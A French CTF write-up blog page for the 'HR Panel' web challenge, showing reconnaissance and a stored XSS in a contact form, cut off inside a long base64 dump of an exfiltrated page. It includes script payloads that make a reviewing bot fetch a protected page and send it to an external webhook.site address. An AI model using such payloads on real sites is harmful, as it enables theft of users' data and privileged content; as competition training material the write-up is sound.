@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Challenge conçu par Worty'>
+<title>Inter IUT - HR Panel (1, 2 &amp; 3)</title>
+
+<link rel='canonical' href='https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/'>
+
+<link rel="stylesheet" href="/scss/style.min.72bf3b6b8742f1a19f075cb2a505ab7a2e10e70d35ecfd60574c046ccb51702a.css"><meta property='og:title' content='Inter IUT - HR Panel (1, 2 &amp; 3)'>
+<meta property='og:description' content='Challenge conçu par Worty'>
+<meta property='og:url' content='https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/'>
+<meta property='og:site_name' content='Endeavxor'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-06-21T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-21T00:00:00&#43;00:00'/><meta property='og:image' content='https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/cover.jpg' />
+<meta name="twitter:title" content="Inter IUT - HR Panel (1, 2 &amp; 3)">
+<meta name="twitter:description" content="Challenge conçu par Worty"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://endeavxor.github.io/p/inter-iut-hr-panel-1-2-3/cover.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Afficher le menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c93562a3964b7563d41933edfb30080_39192_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Endeavxor</a></h1>
+            <h2 class="site-description">Computer Science &amp; Infosec</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Endeavxor'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Endeavxor'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Mode sombre</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table des matières</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#découverte-du-site">Découverte du site</a></li>
+    <li><a href="#exploitation-de-la-faille-xss">Exploitation de la faille XSS</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#exploitation-dune-local-file-inclusion-lfi-grâce-à-une-xml-external-entity-injection-xxe-dans-le-docx">Exploitation d&rsquo;une Local File Inclusion (LFI) grâce à une XML External Entity Injection (XXE) dans le .docx</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#remote-code-execution-rce">Remote Code Execution (RCE)</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/inter-iut-hr-panel-1-2-3/">
+                <img src="/p/inter-iut-hr-panel-1-2-3/cover_huc265a5118e6b97a0e7d177e19ea0a1cf_549279_800x0_resize_q75_box.jpg"
+                        srcset="/p/inter-iut-hr-panel-1-2-3/cover_huc265a5118e6b97a0e7d177e19ea0a1cf_549279_800x0_resize_q75_box.jpg 800w, /p/inter-iut-hr-panel-1-2-3/cover_huc265a5118e6b97a0e7d177e19ea0a1cf_549279_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Inter IUT - HR Panel (1, 2 &amp; 3)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/inter-iut-hr-panel-1-2-3/">Inter IUT - HR Panel (1, 2 &amp; 3)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Challenge conçu par Worty
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 21, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minutes de lecture
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="tldr">TLDR</h1>
+<ul>
+<li>XSRF afin de forcer le bot de maintenance à nous afficher du contenu inaccessible</li>
+<li>LFI via XXE sur un .docx</li>
+<li>RCE via création d&rsquo;un fichier PHP sur le serveur</li>
+</ul>
+<h1 id="hr-panel-1---150pts">HR-Panel 1 - 150pts</h1>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/hrpanel1.png"
+	width="493"
+	height="474"
+	srcset="/p/inter-iut-hr-panel-1-2-3/hrpanel1_hua1e0795d6b8e665b1c657c9f258d1fc9_41982_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/hrpanel1_hua1e0795d6b8e665b1c657c9f258d1fc9_41982_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="104"
+		data-flex-basis="249px"
+	
+></p>
+<h2 id="découverte-du-site">Découverte du site</h2>
+<p>Lorsque l&rsquo;on arrive sur le site, nous sommes face à une page classique avec la possibilité de s&rsquo;inscrire puis de se connecter.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/discover.gif"
+	width="1024"
+	height="404"
+	srcset="/p/inter-iut-hr-panel-1-2-3/discover_hu3fcc11873e9948f491de094333d2a191_283402_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/discover_hu3fcc11873e9948f491de094333d2a191_283402_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="608px"
+	
+></p>
+<p>Un premier réflexe est de regarder dans le fichier robots.txt à la racine du site.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/robots.png"
+	width="191"
+	height="43"
+	srcset="/p/inter-iut-hr-panel-1-2-3/robots_hu55f200ecbef964951ba0beb68c6f57af_2496_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/robots_hu55f200ecbef964951ba0beb68c6f57af_2496_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="444"
+		data-flex-basis="1066px"
+	
+></p>
+<p>On y découvre un fichier intéressant qui ne doit pas être pris en charge par les web crawlers de Google : .htaccess
+En tentant d&rsquo;y accéder directement, on observe que la ressource existe bel et bien mais que nous ne sommes pas autorisés à y accéder.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/htaccess.png"
+	width="752"
+	height="375"
+	srcset="/p/inter-iut-hr-panel-1-2-3/htaccess_huc3a1bbc445b9656815498e91a803a7bc_20321_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/htaccess_huc3a1bbc445b9656815498e91a803a7bc_20321_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="481px"
+	
+></p>
+<p>Après quelques tests infructueux sur des failles classiques sur la partie du login (SQLi etc &hellip;), on décide de simplement créer un compte (<em>on remarque dans le code source des restrictions sur la syntaxe du mail &ldquo;*@inter-iut.fr&rdquo; et de l&rsquo;ID &ldquo;[A-Z][0-9]-[0-9]{3}-[A-Z]{2}&quot;)</em></p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/register.png"
+	width="611"
+	height="545"
+	srcset="/p/inter-iut-hr-panel-1-2-3/register_hu95dba03f5c750ee372c078d230836bc3_32578_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/register_hu95dba03f5c750ee372c078d230836bc3_32578_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="269px"
+	
+></p>
+<p>On y aperçoit 3 nouveaux liens dans le menu du haut :</p>
+<ul>
+<li>Services (Inaccessible pour le moment depuis notre compte)</li>
+<li>My account (Qui liste les informations du compte avec la possibilité de changer de mot de passe)</li>
+<li>Contact (Un formulaire de contact qui permet de demander de l&rsquo;aide)</li>
+</ul>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/login.gif"
+	width="1024"
+	height="459"
+	srcset="/p/inter-iut-hr-panel-1-2-3/login_hu5bb74d7d68fb68848550f18e1cf1b52d_305087_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/login_hu5bb74d7d68fb68848550f18e1cf1b52d_305087_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="535px"
+	
+></p>
+<p>Il est alors judicieux d&rsquo;aller investiguer cette fameuse fonctionnalité permettant de contacter quelqu&rsquo;un. Le premier réflexe est de tester si le message envoyé est traité côté serveur afin de supprimer des éventuelles balises de script qui pourront exécuter du Javascript. On teste donc la payload suivante qui, si elle fonctionne redirigera la personne qui lit ce message sur notre site.</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd&#34;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p><img src="/p/inter-iut-hr-panel-1-2-3/xss_test.png"
+	width="803"
+	height="473"
+	srcset="/p/inter-iut-hr-panel-1-2-3/xss_test_hu219b9c44bc54b40c04cb56f04b7e824d_23121_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/xss_test_hu219b9c44bc54b40c04cb56f04b7e824d_23121_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="407px"
+	
+></p>
+<p>Après quelques secondes on reçoit bien une requête sur notre site, indiquant la validité d&rsquo;une faille XSS sur la page de contact.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/hit_test_xss.png"
+	width="823"
+	height="68"
+	srcset="/p/inter-iut-hr-panel-1-2-3/hit_test_xss_huff79735446688c83a9481e0fec31af66_15181_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/hit_test_xss_huff79735446688c83a9481e0fec31af66_15181_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1210"
+		data-flex-basis="2904px"
+	
+></p>
+<h2 id="exploitation-de-la-faille-xss">Exploitation de la faille XSS</h2>
+<p>La suite logique de cette faille va être de forcer l&rsquo;entité qui lit notre message (en l&rsquo;occurrence un bot au vu de l&rsquo;header REFERER reçu dans la réponse de la requête) à réaliser des actions à notre place, en espérant qu&rsquo;elle dispose de plus de privilèges que nous. Ce que l&rsquo;on souhaiterait dans un premier temps c&rsquo;est d&rsquo;accéder au contenu de la page /services . On va donc utiliser la payload suivante afin de forcer le bot à récupérer son contenu, l&rsquo;encoder en base64 puis l&rsquo;envoyer sur notre site.</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;/services&#39;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)));</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>( <em>Pour ce writeup vous noterons le double encodage en base64, ce n&rsquo;est pas quelquechose que j&rsquo;avais utilisé lors du CTF puisque je passait directement sur mon VPS, mais pour une raison que j&rsquo;ignore encore c&rsquo;est le seul moyen de récupèrer sur le site les données sans problème)</em></p>
+<p>Après quelques secondes, nous recevons une magnifique requete avec beaucoup de contenu en base64, il s&rsquo;agit en faite de la page /services, après <strong>double</strong> décodage on obtient :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/hit_xss_page_services.png"
+	width="1101"
+	height="69"
+	srcset="/p/inter-iut-hr-panel-1-2-3/hit_xss_page_services_hu333eab519e150132871d77f8d429f8bf_40484_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/hit_xss_page_services_hu333eab519e150132871d77f8d429f8bf_40484_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1595"
+		data-flex-basis="3829px"
+	
+></p>
+<details>
+	<summary>Page /services double encodé en base64</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMkZrYldsdUwzVnpaWEp6SWo1QlpHMXBiand2WVQ0Z0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlCaFkzUnBkbVVpSUdoeVpXWTlJaTl6WlhKMmFXTmxjeUkrVTJWeWRtbGpaWE1nSUR4emNHRnVJR05zWVhOelBTSnpjaTF2Ym14NUlqNG9ZM1Z5Y21WdWRDazhMM053WVc0K1BDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUlnYUhKbFpqMGlMMk52Ym5SaFkzUWlQa052Ym5SaFkzUThMMkUrQ2lBZ0lDQWdJQ0FnUEdFZ1kyeGhjM005SW01aGRpMXBkR1Z0SUc1aGRpMXNhVzVySWlCb2NtVm1QU0l2YldVaVBrMTVJR0ZqWTI5MWJuUThMMkUrSUNBS0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5c2IyZHZkWFFpUGt4dloyOTFkRHd2WVQ0S0lDQWdJRHd2WkdsMlBnb2dJRHd2WkdsMlBnbzhMMjVoZGo0S0lDQWdJQW9nSUNBZ1BHUnBkaUJqYkdGemN6MGlZMjl1ZEdGcGJtVnlJajRLSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKeWIzY2lQZ29nSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BIQWdZMnhoYzNNOUlteGxZV1FpSUhOMGVXeGxQU0p0WVhKbmFXNHRkRzl3T2lBeU1IQjRPeUJqYjJ4dmNqb2dZbXhoWTJzN0lqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JJWld4c2J5QnlhRjloWkcxcGJsOXpaWEoyYVdObExDQjNhR2xqYUNCelpYSjJhV05sY3lCM2IzVnNaQ0I1YjNVZ2JHbHJaU0IwYnlCMWMyVS9JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZjRDRnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhSEl2UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEdScGRpQmpiR0Z6Y3owaWNtOTNJajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krUVdOalpYTnpJRzE1SUhCaGVTQnpiR2x3Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5emJHbHdjeWNpUGtGalkyVnpjend2WW5WMGRHOXVQand2Y0Q0S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEM5a2FYWStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajRLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMnd0YzIwdE5DSStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpZWEprSWlCemRIbHNaVDBpWW1GamEyZHliM1Z1WkMxamIyeHZjam9nSXpVeU9XSmpNRHNpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtMV0p2WkhraVBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG9OU0JqYkdGemN6MGlZMkZ5WkMxMGFYUnNaU0krVFdGdVlXZGxJRzE1SUhaaFkyRjBhVzl1Y3p3dmFEVStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbU5oY21RdGRHVjRkQ0krUEdKeVBqeGlkWFIwYjI0Z1kyeGhjM005SW1KMGJpQmlkRzR0Y0hKcGJXRnllU0lnYjI1amJHbGphejBpWkc5amRXMWxiblF1Ykc5allYUnBiMjQ5Snk5elpYSjJhV05sY3k5MllXTmhkR2x2Ym5NbklqNUJZMk5sYzNNOEwySjFkSFJ2Ymo0OEwzQStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzlrYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQQzl